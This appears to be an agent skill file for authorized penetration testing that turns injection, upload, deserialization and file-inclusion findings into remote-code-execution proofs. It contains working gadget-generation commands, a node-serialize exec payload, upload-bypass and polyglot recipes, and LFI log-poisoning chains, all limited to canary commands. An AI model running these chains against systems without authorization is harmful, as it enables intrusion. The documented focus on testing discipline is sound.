---
name: rce_fast_path_verification
description: Use when converting a confirmed injection, upload, deserialization, or
  file-inclusion finding into demonstrated remote code execution, and when proving
  impact safely - deserialization gadget chains, upload validation bypasses and polyglots,
  LFI-to-RCE chains, and benign command-execution proofs.
---

# RCE verification & impact proof (P1.5 Fast-Path & P6)

Verify a prioritized P1.5 CVE (`70` / `15`) or confirmed P5 sink (`40`) by
demonstrating benign canary evaluation. The proof is a deterministic canary
artifact + baseline negative control, never a shell or destructive payload.

## The way

- The proof catalog is closed: `id`, `whoami`, `hostname`, canary echo
  (`rj-pt-<engagement>-<nonce>`), deterministic SSTI/EL arithmetic or
  property evaluation (`references/ssti-and-expression-rce.md`), or single
  DNS canary. One clean proof + negative control + D2 replay, then stop.
  Shells, persistence and credential access are scope violations.
- Fast-path CVE verification (P1.5): when `70` or `15` identifies a Tier 1/2
  RCE CVE or template, run the targeted `nuclei_scan` (with `cve_id` or
  `template`) or single benign canary check first before generic P5 fuzzing.
- SSTI & Expression Languages (Twig, Smarty, Blade, Jinja2, Freemarker,
  Velocity, Thymeleaf, SpEL, OGNL): prove template context with benign
  non-executing markers / arithmetic differentials before claiming RCE.
- Chain selection is version-driven: fingerprint -> `70` correlation ->
  benign proof. Upload checks verify cleanup (404 re-check after deletion).
- LFI: read-only filter chain first; never mutate server state without
  explicit operator approval. Unknown gadgets -> `75`.

## Handoffs

Versions/gadgets -> `70`; CMS/shop surfaces -> `15`; novel chains -> `75`;
detection notes -> `85`; D2 + negative control -> `95` -> `90`.

## Tools

`rce_verify.py` (bounded canary template list; `_NoRedirect` scope-guarded),
`upload_bypass_gen.py` (offline). Chain tables — SSTI/EL matrix,
deserialization magics, bypass matrix, LFI chains, safety doctrine — in
`references/`.

---

## Reference Module: `deserialization-chains`

# Deserialization chains (CWE-502)

Magic-byte table, per-language chain summaries, canary gadget examples, and
the delivery vector checklist. Gadget generation happens offline with named
tools; the command slot is always a benign proof (`id`, canary echo).

## 1. Format fingerprint table

| Runtime | Raw marker | Base64 marker | Where commonly found |
|---|---|---|---|
| Java | `aced 0005` stream header | `rO0AB` prefix | remember-me cookies, HTTP session blobs, RMI/T3, JMS messages, cache files |
| PHP | `O:<N>:"Class":<N>:{...}`, `a:<N>:{...}`, `R:n` references | often plain in cookies/params | session handlers, custom "object" cookies |
| Python pickle | protocol markers `\x80\x02` .. `\x80\x05`, opcodes `cos\nsystem\n` / `__reduce__` shapes | `gAJ` (proto 2), `gAN` (3), `gASV` (4), `gAWV` (5) prefixes | Django/Flask signed cookies (`itsdangerous` base64 payloads), Celery/Redis values, cache entries |
| .NET | `00 01 00 00 00 ff ff ff ff` (NRBF header) | `AAEAAAD/////` prefix | `__VIEWSTATE` (when not MAC-protected), `LosFormatter` blobs, remoting |
| Ruby Marshal | `\x04\x08` version + `o:<Class>` | base64 `BAhO...` (`\x04\x08o:`) | Rails cookie store (legacy), cache |
| Node | `_$$ND_FUNC$$_` marker (`node-serialize`) | base64 in tokens | custom auth tokens, session files |

Fingerprinting steps: URL-decode, then base64-decode when it round-trips, then
hex-dump the first bytes. Record the runtime + library version (session
cookie names, framework banners from `10`/`70`) before choosing a gadget.

## 2. Per-language chain summaries

### Java
- Entry: any code path calling `ObjectInputStream.readObject()` on the blob.
- Chains: CommonsCollections (multiple), CommonsBeanutils, Spring, Hibernate,
  Jackson polymorphic typing (`@class`), JRE-only chains (e.g. via
  `javax.naming`).
- Generate offline: `java -jar ysoserial.jar CommonsCollections5 'echo
  rj-pt-<engagement>-<nonce>' > payload.bin` — pick the gadget matching the
  fingerprinted library version from `70-exploit-intel`.
- Delivery: replace the blob in the cookie/field; keep the transport encoding
  (base64/hex) the application used.

### PHP
- Entry: `unserialize()` on user input; POP gadget chains depend on the
  application's classes (source code) or framework (Laravel/Monolog gadgets).
- Generate offline: `./phpggc Laravel/RCE1 'echo rj-pt-<engagement>-<nonce>'`
  (base64 wrapper when the transport needs it).
- Phar deserialization: `phar://` stream triggers metadata `__destruct` —
  needs a reachable `phar://` consumer; treat as upload-chain crossover.

### Python
- Entry: `pickle.loads()` / `yaml.load()` (unsafe Loader) on user bytes.
- Canary gadget (canonical `__reduce__` form):

```python
import pickle, base64
class Canary:
    def __reduce__(self):
        return (print, ("rj-pt-<engagement>-<nonce>",))
print(base64.b64encode(pickle.dumps(Canary())))
```

- Signed-cookie stacks (itsdangerous) only deserialize after signature checks
  — finding a signing-key leak (`50-config-baseline`) is part of the chain.

### .NET
- Entry: `BinaryFormatter`/`ObjectStateFormatter`/`LosFormatter` on input;
  `__VIEWSTATE` without MAC/validation or with a leaked `machineKey`.
- Generate offline: `ysoserial.net -f BinaryFormatter -g ViewState -c "id"`.
- TypeConfuseDelegate / TextFormattingRunProperties are the classic gadgets;
  match .NET version from headers.

### Ruby / Node
- Ruby Marshal chains (erb/ERB, gem-dependent); Node: `node-serialize`
  IIFE-in-string (`{"rce":"_$$ND_FUNC$$_function(){require('child_process')
  .exec('id')}()"}`) — canonical textbook form, command slot stays benign.

## 3. Delivery vector checklist

- Cookie values (remember-me, session, "user" blobs) — keep original encoding
  and separators; watch `Set-Cookie` shapes first.
- Hidden form fields (`<input type=hidden name=... value=blob>`).
- Custom headers (`X-Auth-User`, `X-Serialized-Object`).
- JSON bodies where a base64 string field round-trips through pickle/java.
- Uploaded files consumed by a loader (import/export features).
- Cache values (Redis/Memcached keys observed via SSRF from `40`).

For each: send an unmodified re-serialization first (mutation-free round-trip
check) to prove the endpoint really deserializes, then the canary gadget.

## 4. Safe verification

- Gadget command = `echo rj-pt-<engagement>-<nonce>` (or `id`).
- In-band: canary appears in the response; keep the pair.
- Blind: DNS-safe `ping -c 1 -W 1 <canary-domain>` — one packet, bounded
  wait, verified on the `20` OOB listener. No other network commands.
- Never: reverse shells, downloaders, sleep loops, file writes beyond
  operator-approved canary files.
- If the blob is MAC/signed and the key is unknown, the finding is
  "unsigned/pickle-capable format" with its exact limits — no execution claim.

## 5. Evidence requirements

- Fingerprint proof (hex dump excerpt + where the blob was found).
- Round-trip re-serialization request/response (proves deserialization).
- Canary gadget request/response (or OOB listener log excerpt).
- Generation command verbatim (tool + gadget + version match note).
- Both D2 runs + cleanup confirmation (no artifacts created by this class
  beyond requests, unless a canary file was authorized — then its deletion).


---

## Reference Module: `impact-safety`

# Impact safety

Benign proof catalog, cleanup checklist, proportionality rules, and when a
canary callback is enough. These rules bind every execution proof in this
skill; they mirror master §0 and `00-master.../references/evidence-gates.md`.

## 1. Benign proof catalog (the only allowed command slots)

| Proof | Command/shape | Shows |
|---|---|---|
| identity | `id` | uid/gid of the executing context |
| username | `whoami` | process user |
| hostname | `hostname` (or `file:///etc/hostname` for XXE) | host identity (env separation proof) |
| canary echo | `echo rj-pt-<engagement>-<nonce>` / `printf %s rj-pt-...` | attacker-controlled output reached execution |
| template render | engine-specific evaluation of `7*7` or a canary literal | code evaluation without commands |
| DNS canary | `ping -c 1 -W 1 <canary-domain>` | blind execution, one packet, bounded wait |
| HTTP canary | fetch of `http://canary.rj-pt.example/...` | blind SSRF/XXE/execution via the `20` listener |

Canary format: `rj-pt-<engagement>-<nonce>` — the nonce makes every proof
attributable and unforgeable in logs.

Explicitly NOT proofs, never run: reverse shells, bind shells, staged
payloads, `curl|sh` shapes, adding users, creating cron/services, opening
listeners, downloading tooling. These are prohibited regardless of scope.

## 2. Proportionality rules

1. Stop at demonstration: one clean proof + one D2 replay. If the canary
   echoed once, re-running with "more interesting" commands is out of scope.
2. Choose the lightest proof that establishes the claim:
   - reflected output -> canary echo;
   - blind but observable -> DNS canary (single packet);
   - template engines -> arithmetic/canary render before any OS command.
3. Data claims need separate authorization: reading `/etc/shadow`, user
   tables, or private repos is a data-access engagement, not an RCE proof.
4. Destructive or state-changing operations (delete, mass update, service
   restart) are prohibited outright (master §0).
5. Depth beyond proof (post-exploitation, pivoting, tunneling) is never part
   of this skill; if the operator wants it, it is a new authorized phase with
   its own rules.
6. If the target is a shared/production system, prefer blind DNS canary over
   response-visible payloads that might page an on-call operator.

## 3. When a canary callback is enough

A canary callback (DNS hit on the `20` listener, canary string in a response)
is sufficient evidence of execution for the finding. Specifically:

- Blind command injection: `ping -c 1 -W 1 <canary-domain>` DNS hit proves
  execution; no echo channel needed.
- Blind deserialization: gadget `echo`/DNS ping; response need not change.
- Blind SSRF/XXE: any labeled interaction on the listener.
- Sandboxed SSTI: successful arithmetic evaluation (`{{7*7}}` -> `49`) with an
  engine fingerprint is a D2 finding even without OS command execution —
  state the exact limit ("expression evaluation confirmed; sandbox blocked
  OS access").

Rule: execution-of-attacker-syntax is the claim; the canary is its witness.
Never upgrade claims beyond what the witness shows.

## 4. Cleanup checklist (attach to every finding)

- [ ] Uploaded files deleted; each storage path re-requested and 404 captured.
- [ ] `.htaccess` / `web.config` / config uploads removed; original behavior
      re-verified.
- [ ] Poisoned session values overwritten or sessions discarded (list ids).
- [ ] Stored-XSS payloads / profile fields reverted (coordinate with `40`).
- [ ] Engagement-side canary files on the `20` listener removed.
- [ ] Log-pollution inventory written (lines/timestamps) and handed to
      `85-logging-monitoring` for the debrief scrub request.
- [ ] No accounts, cron jobs, scheduled tasks, listeners, or files created
      beyond those listed above (verify by listing what you recorded during
      the chain).
- [ ] Cleanup confirmation included in the finding record BEFORE D3 review.

## 5. Evidence shape for execution findings

- Both D2 runs: `evidence/p6-rce-<surface>-<seq>.{req,resp}.txt` per run,
  from a clean state (fresh session/token where applicable).
- Exact payload + encode rung; generation command for gadget tools verbatim.
- Version proof for the vulnerable component when a CVE is claimed.
- The canary value visible in the evidence (response body or listener log
  excerpt).
- Cleanup confirmation (404 pairs, restore notes, scrub request line).

## 6. Escalation stop-gates

- Operator authorization missing -> do not attempt execution proofs; report
  the finding at its current gate with stated limits.
- Canary fails but you "know" a stronger payload would work -> that is a
  hypothesis, not a finding; either get authorization for the specific
  stronger proof or hand the chain to `75-zeroday-research` as research.
- Anything that would persist across requests (files outside the engagement
  artifact list, registry, cron) -> stop; that is out of doctrine.


---

## Reference Module: `lfi-rce-chains`

# LFI to RCE chains (CWE-98)

Wrapper/chain list with preconditions and risk notes. Canary content is the
benign form; every chain that writes anything is paired with cleanup.

## 1. Prerequisite confirmation

Before any chain: confirm plain LFI with a read of a deterministic file
(`/etc/hostname`, `/etc/passwd` existence — do not copy user data out; note
readability and stop). Record the include base path (relative/absolute
behavior, null-byte sensitivity, filter behavior).

## 2. Source-disclosure chain (read first, always)

- `?file=php://filter/convert.base64-encode/resource=index.php` — base64 of
  the executed source decodes offline. Use it to map: upload paths, session
  save path (`session.save_path`), `allow_url_include`, log file paths.
- `php://filter/convert.base64-encode/resource=.htaccess` / config files:
  secrets found (DB passwords, keys) are recorded REDACTED in evidence and
  never exfiltrated — the finding is "source disclosure", not data access.
- Wrapper variants: `convert.iconv.UTF-8.UTF-7` chains are documented in the
  wild (filter-chain RCE); treat as `75-zeroday-research` territory — novel
  chain, operator approval first.

## 3. Session-file inclusion

Preconditions: session values you control are persisted server-side
(e.g. `$_SESSION['lang'] = $_GET['lang']`); session save path known
(default `/var/lib/php/sessions/` or `/tmp/`; confirm via filter reads or
`phpinfo` exposure from `50`).

Chain:

1. Set the controlled session value to canary content:
   `?lang=<?php echo "rj-pt-<eng>-<nonce>"; ?>` (URL-encoded).
2. Include the session file: `?file=/var/lib/php/sessions/sess_<PHPSESSID>`.
3. Canary echo = proof. Cleanup: re-visit the page with a fresh value or let
   the session expire; note the session id used.

## 4. Log poisoning

Preconditions: readable log path through the LFI; controlled input lands
VERBATIM in the log (User-Agent in access.log is classic); the include
executes PHP found in the file.

Chain:

1. Confirm read: `?file=/var/log/apache2/access.log` (or nginx
   `/var/log/nginx/access.log`, ssh `/var/log/auth.log` — caution).
2. Send one request whose User-Agent is exactly the canary content
   (`User-Agent: <?php echo "rj-pt-..."; ?>`).
3. Include the log file; canary echo = proof.

Caution (binding):

- One poison line, one include probe — do not spam logs.
- Shared-hosting logs contain other tenants' data: if the log read shows
  third-party content, stop and record an observation instead.
- Requires operator approval before poisoning production logs.
- Cleanup: log lines cannot be deleted remotely — the cleanup confirmation is
  the scrub/rotate request handed to the blue team at debrief (`85`).

## 5. /proc chains (scope caution)

- `/proc/self/environ`: reflects request headers on legacy CGI/mod_php
  setups. CAUTION: environ can contain real secrets — test ONLY with a
  controlled canary header (`X-Canary: <?php echo ... ?>`) and stop at the
  proof; do not dump the whole file.
- `/proc/self/fd/N`: open file descriptors may alias the access log or an
  uploaded temp file; enumerate serially, small N range, stop at proof.
- `/proc/self/cmdline`: reveals the interpreter invocation (php flags) with
  no execution risk — useful before choosing later chains.

## 6. Remote/wrapper inclusions

| Wrapper | Preconditions | Proof form |
|---|---|---|
| `http://` / `https://` (RFI) | `allow_url_include=On` (confirm via filter/phpinfo) | include engagement-controlled URL on the `20` listener serving canary PHP |
| `data://text/plain;base64,...` | `allow_url_include=On` | inline base64 canary content |
| `expect://id` | expect wrapper compiled in (rare) | benign `id` output |
| `phar://uploads/x.png/file.txt` | uploaded phar + phar stream consumer | metadata gadget — pairs with `references/deserialization-chains.md` |
| `zip://uploads/x.zip#shell.rjpt` | zip upload accepted + zip wrapper | canary content member |

## 7. Chain pairing with uploads

If the upload bypass (`references/upload-bypass.md`) stored content but the
web server won't execute it, an LFI include of the stored path may still
execute it (`?file=/uploads/shell.rjpt` with or without `.htaccess` help) —
upload and LFI findings chain; record both artifacts and clean both.

## 8. Cleanup checklist per chain

- Session chain: overwrite the poisoned session value or discard session.
- Log chain: no remote deletion possible — scrub request to blue team.
- Upload/zip artifacts: delete + 404 re-check.
- Wrapper/RFI: remove the engagement-side canary file from the `20` listener.


---

## Reference Module: `ssti-and-expression-rce`

# Non-Destructive Template & Expression Evaluation Verification (P1.5 / P5)

Reference guide for distinguishing true Server-Side Template Injection (SSTI)
and Expression Language (EL) evaluation from literal reflection or client-side
template rendering. All verification under `45-rce-exploitation` is strictly
non-destructive and stops at evaluation proof (D2).

---

## 1. Two-Probe Differential Verification Protocol (D2)

Never claim template or expression evaluation from a single reflected string or
an HTTP 500 status code alone. Every candidate sink requires two paired
requests recorded in the engagement workspace:

1. **Negative Control (Inert Baseline):**
   - Supply an inert alphanumeric canary with matching delimiters removed or
     escaped (e.g., `rj-ctrl-7391`).
   - Record status code, response headers, and body hash (`baseline.req.txt` /
     `baseline.resp.txt`).
2. **Benign Evaluation Check (Computed Canary):**
   - Supply a side-effect-free arithmetic or string-concatenation expression
     native to the suspected template family, paired with a static prefix/suffix
     tag (`rj-eval-<expr>`).
   - **Verified (D2)** only if the response contains the *computed* output
     (and *not* the unrendered expression text alone) across two independent
     runs, while the negative control does not.

---

## 2. Engine Identification Matrix (Safe Benign Indicators)

Use the engine family already fingerprinted in `10` or `15` to choose a single
family-appropriate benign check rather than spraying polyglots across every
parameter:

| Stack / Framework | Template / Expression Engine | Delimiter Family | Benign Verification Signal | CWE |
|---|---|---|---|---|
| PHP (Shopware, Craft, Symfony) | Twig | `{{ ... }}` | Computed integer/string filter output vs literal `{{` reflection | CWE-1336 |
| PHP (PrestaShop, legacy CMS) | Smarty | `{ ... }` | Evaluated mathematical/variable tag output in rendered HTML/email preview | CWE-1336 |
| PHP (Laravel, Statamic) | Blade | `{{ ... }}` / `@` | Unescaped directive rendering in dynamic view strings (`Blade::render`) | CWE-1336 |
| Python (Flask, Django, FastAPI) | Jinja2 / Django | `{{ ... }}` | Evaluated arithmetic/filter expression in dynamic template string | CWE-1336 |
| Java (Spring Boot, MVC) | Thymeleaf / SpEL | `${ ... }` / `*{ ... }` | View-name or fragment expression evaluation differential | CWE-917 |
| Java (Freemarker, Velocity) | FreeMarker / Velocity | `${ ... }` / `#set` | Built-in string/number formatting evaluation in preview/template endpoints | CWE-1336 |
| Java (Struts / legacy web) | OGNL | `%{ ... }` | Evaluated arithmetic attribute value in tag/action response | CWE-917 |
| Node.js (Express, Next, Nunjucks) | EJS / Pug / Nunjucks / Handlebars | `<%= ... %>` / `{{ ... }}` | Computed expression output in server-rendered HTML fragment | CWE-1336 |

---

## 3. High-Probability Sinks in E-Commerce & CMS Targets

Prioritize these endpoints when `15-cms-ecommerce-rce` or `10-recon-endpoint-mapping`
identifies a CMS or storefront:

- **Email & Invoice Preview Endpoints:** Order confirmation previews, PDF
  invoice renderers, and transactional email template testers.
- **Dynamic CMS Blocks & Theme Filters:** Custom CMS page preview endpoints,
  dynamic block renderers, and search/sort filter expressions.
- **Webhook & Rule Evaluators:** Promotion/cart price rule condition preview
  endpoints and custom export formatters.

---

## 4. False-Positive Rejection Rules

- **Client-Side Angular/Vue/React Rendering:** If the raw HTTP response body
  from `curl` or `rce_verify.py` still contains the literal `{{ ... }}` syntax
  uncomputed, the expression was not evaluated server-side. Reclassify as
  client-side template reflection (`55-client-side-attacks`), never `45`.
- **Generic 500 Internal Server Error:** A syntax error from malformed brackets
  proves only an unvalidated parser boundary (Information/Low or D1 candidate),
  never `Verified` RCE/SSTI.
- **No OS Process Spawning Needed for D2:** Once deterministic server-side
  expression evaluation is proven via computed output + negative control on a
  documented engine sink, stop and hand off to `95-finding-verifier` and `90`.


---

## Reference Module: `upload-bypass`

# Upload bypass matrix (CWE-434)

Full bypass matrix, polyglot construction notes, server-specific execution
rules. All code content is the benign canary form
(`<?php echo "rj-pt-<engagement>-<nonce>"; ?>`) — no webshells, no command
loops. Generate the matrix with `scripts/upload_bypass_gen.py`.

## 1. Filename bypass matrix

| Technique | Examples (base `shell.php`) | Defeats |
|---|---|---|
| case | `shell.PHP`, `shell.pHp`, `SHELL.php` | blocklists matching lowercase `.php` |
| allowlist siblings | `shell.php3` `shell.php4` `shell.php5` `shell.php7` `shell.phtml` `shell.pht` `shell.phar` | allowlists accepting "image or php-family by misconfiguration" and servers mapping siblings to PHP |
| double extension | `shell.php.jpg`, `shell.jpg.php`, `shell.php.png` | naive "ends with image ext" checks on Apache (multi-handler), and `basename` confusion |
| trailing chars | `shell.php.`, `shell.php ` (trailing space) | Windows stores strip trailing dot/space; blocklists comparing raw name |
| null byte (legacy) | `shell.php%00.jpg`, `shell.php\x00.jpg` | PHP < 5.3.4 / old Java URL handlers — modern stacks immune; mark legacy |
| NTFS ADS | `shell.php::$DATA`, `shell.php:.jpg` | IIS/NTFS streams; blocklist sees `.jpg` |
| IIS semicolon | `shell.asp;.jpg` | IIS 6/7.x classic parses up to `;` |
| dot after ext | `shell.php.` (dot run `shell..php`) | regex `\.php$` mismatches |
| unicode look-alike | `sh​ell.php` (zero-width), `shell.p hö` | naive normalization/regex checks — verify what the store really received |
| path traversal | `../../shell.php`, `..\..\shell.php` | filename joined into storage path; writes outside the upload dir (coordinate — may be out of web root; that is LFI-chain territory) |

Upload serially, one variant at a time; record exactly which variant was
accepted and where it was stored.

## 2. Content bypass matrix

| Technique | Content shape | Defeats |
|---|---|---|
| MIME mismatch | PHP canary content, `Content-Type: image/jpeg` | client-side or header-only validation |
| magic-byte prefix | `GIF89a` + `\n` + canary PHP | `getimagesize()`-only checks, weak sniffers |
| real image + payload | valid JPEG/PNG with payload in metadata/comment | content sniffers that parse the image and ignore comments |
| config upload | `.htaccess` (`AddType application/x-httpd-php .rjpt`) then `shell.rjpt` (canary PHP content) | Apache: extension allowlists that ignore dotfiles |
| config upload (IIS) | `web.config` mapping `*.rjpt` to the ASP.NET handler, then `shell.rjpt` | IIS allowlists ignoring web.config |
| zip-slider | archive entry named `../../../../var/www/shell.rjpt` | extraction-time path traversal (zip-slip) — server must extract archives |

## 3. Polyglot byte-level recipes

Canary content placeholder: `CANARY_PHP = <?php echo "rj-pt-<eng>-<nonce>"; ?>`

- GIF/PHP: `47 49 46 38 39 61` (`GIF89a`) + `0A` + `CANARY_PHP`. Passes
  `getimagesize()`; executes when served through PHP handler.
- JPEG/PHP: SOI `FF D8` + APP0 `FF E0 00 10 4A 46 49 46 00 ...` + COM segment
  `FF FE <len16>` containing `CANARY_PHP` + EOI `FF D9`. Payload inside a
  valid JPEG stream.
- PNG/PHP: signature `89 50 4E 47 0D 0A 1A 0A` + minimal IHDR + `tEXt` chunk
  (`74 45 58 74` + `Payload\0` + `CANARY_PHP` + CRC32 of the chunk data) +
  `IEND`. Chunk CRC must be computed — descriptions only here; build in the
  container when needed.
- zip-slider: standard ZIP with entry name `../../../../var/www/html/x.rjpt`
  containing `CANARY_PHP`.

## 4. Server-specific execution rules

| Server | Rule to remember |
|---|---|
| Apache + mod_php | `AddHandler application/x-httpd-php` matches ANY extension in a multi-dot name — `shell.php.jpg` executes when `.php` appears anywhere |
| Apache + php-fpm | `SetHandler`/ProxyPassMatch — usually exact `.php`; try `.phtml`/siblings |
| nginx + php-fpm | legacy `cgi.fix_path_info=1` executes `/shell.jpg/x.php` (path-info); modern `try_files` blocks it — verify, don't assume |
| IIS | semicolon parsing (`shell.asp;.jpg`), ADS (`::$DATA`), `web.config` handler mapping |
| S3/CDN-fronted stores | no execution by default; the finding is content-type/serve-as-HTML (stored XSS chain to `55`), not RCE — state limits exactly |

## 5. Execution trigger discovery

1. Find the stored path: upload response body, predictable
   `/uploads/<ts>_<name>`, directory listing via `10`.
2. Re-request the stored file; success = canary echo in body.
3. If inert: try path-info suffixes (`/file.jpg/x.php`), sibling extensions
   for the same stored content, and a second request after `.htaccess`
   upload.
4. Multiple frontends possible: test the origin URL directly when the CDN
   masks it (from the P1 inventory).
5. Prove once, replay for D2, then delete the file and re-request until 404 —
   the 404 response is the cleanup evidence.

## 6. Cleanup

- Delete every uploaded variant (accepted or not, if it stored).
- Re-request each stored path until 404; keep one 404 pair per file.
- Remove `.htaccess`/`web.config` if uploaded.
- Note for the debrief: filenames and timestamps remain in access logs —
  hand the list to `85-logging-monitoring`.

